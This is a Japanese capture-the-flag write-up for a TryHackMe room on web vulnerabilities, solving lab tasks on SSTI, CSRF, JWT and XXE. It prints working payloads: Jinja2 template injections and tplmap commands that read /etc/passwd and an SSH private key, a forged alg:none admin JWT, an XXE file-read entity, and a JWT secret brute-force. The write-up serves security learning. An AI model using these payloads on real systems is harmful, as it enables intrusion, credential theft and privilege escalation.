# ZTH: Obscure Web Vulns WriteUp
https://tryhackme.com/room/zthobscurewebvulns

## Section 1 - SSTI
## Task 4
### #1
/etc/passwdを開く。
```
{{config.__class__.__init__.__globals__['os'].popen(/etc/passwd).read()}}
```

### #2
指定されたユーザのid_rsaが置かれているだろうパスを指定する。
```
{{ ''.__class__.__mro__[2].__subclasses__()[40]()(/home/test/.ssh/id_rsa).read()}}
```

## Task 5
### #1
これで正解になったが、実際は`cat /etc/passwd`を`'`などで囲わないとダメな気がする。
```
tplmap -u http://10.10.10.10:5000/ -d 'noot' --os-cmd cat /etc/passwd
```


## Task 6
### #1

画面から`{2*2}`を送信した際のメソッドとパラメータ名を確認する。
```http
POST http://10.10.121.190/ HTTP/1.1
Host: 10.10.121.190
Connection: keep-alive
Content-Length: 16
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.121.190
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.121.190/
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8,ko;q=0.7

name=%7B2%2B2%7D
```

POSTリクエストなので`-d`オプションでパラメータ名`name`を指定する。
```shell
[root@kali]# git clone https://github.com/epinna/tplmap
[root@kali]# cd tplmap/
[root@kali]# ./tplmap.py -u http://10.10.121.190/ -d 'name' --os-cmd 'head /flag'
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  POST parameter: name
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux2
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

❓❓❓❓
```

## Section 2 - XSRF
## Task 9
### #1
PoC作成に必要なパラメータは`--malicious`。

https://github.com/0xInfection/XSRFProbe/wiki/General-Usage#generating-malicious-poc-forms

## Section 3 - JWT
## Task 18
### #1
1回ログインに失敗すると、テスト用のIDとパスワードが画面に表示される。

ログインしてみると、`token`という名のCookieにJWTがセットされる。
```http
Set-Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjAzMTk4OTcwODk3LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84Ni4wLjQyNDAuNzUgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjAzMTk4OTcxfQ.BH1pgSMi_9nJg_ArJCei3x__aG-Pl7EFjAeekpnHBrk; path=/; httponly
```

Base64デコードする。

Header
```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```

Payload
```json
{
  "auth": 1603198970897,
  "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",
  "role": "user",
  "iat": 1603198971
}
```

`alg`が`none`のHeaderを作成し、Base64エンコードする。
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
```

Payloadの`role`を`admin`に差し替えてBase64エンコードする。
```
eyJhdXRoIjoxNjAzMTk4OTcwODk3LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84Ni4wLjQyNDAuNzUgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwMzE5ODk3MX0
```

HeaderとPayloadをつなぎ、Signatureは削除する。  

PayloadとSignatureの間を示す`.`は残す必要がある。
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjAzMTk4OTcwODk3LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84Ni4wLjQyNDAuNzUgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwMzE5ODk3MX0.
```

Cookieの値を上記に差し替え、/privateにGETアクセスすると、画面にflagが表示される。

## Section 4 - XXE
## Task 22
### #1 & #2
設問はユーザ数と、特定のUIDのユーザ名なので、passwdを取得できればよい。

フォームに入力してボタンを押すと、XMLボディでリクエストされる。
```xml
<?xml version="1.0" encoding="UTF-8"?><root><name>user</name><tel>0</tel><email>0@example.com</email><password>password</password></root>
```

XXEにより/etc/passwdを取得するシグネチャに書き換えて実行することで取得できる。
```xml
<?xml version="1.0" encoding="UTF-8"?>  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY pw SYSTEM "file:///etc/passwd" >]>
<root><name>user</name><tel>0</tel><email>&pw;</email><password>password</password></root>
```


## Bonus Section - Challenge
## Task 25
### #1 
JWTをブルートフォースし、secretを特定する。  
**JWT-Cracker**  
https://github.com/lmammino/jwt-cracker

引数は与えられたJWT、使われていそうな文字、調べる最大桁数。  
```shell
[root@kali]# npm install --global jwt-cracker
/usr/local/bin/jwt-cracker -> /usr/local/lib/node_modules/jwt-cracker/index.js
+ jwt-cracker@1.0.6
added 7 packages from 4 contributors in 2.1s
[root@kali]# jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.it4Lj1WEPkrhRo9a2-XHMGtYburgHbdS5s7Iuc1YKOE" "abcdefghijklmnopqrstuvwxyz01234567890" 4
Attempts: 100000
Attempts: 200000
Attempts: 300000
Attempts: 400000
Attempts: 500000
Attempts: 600000
Attempts: 700000
Attempts: 800000
Attempts: 900000
SECRET FOUND: ❓❓❓❓
Time taken (sec): 11.437
Attempts: 988471
```
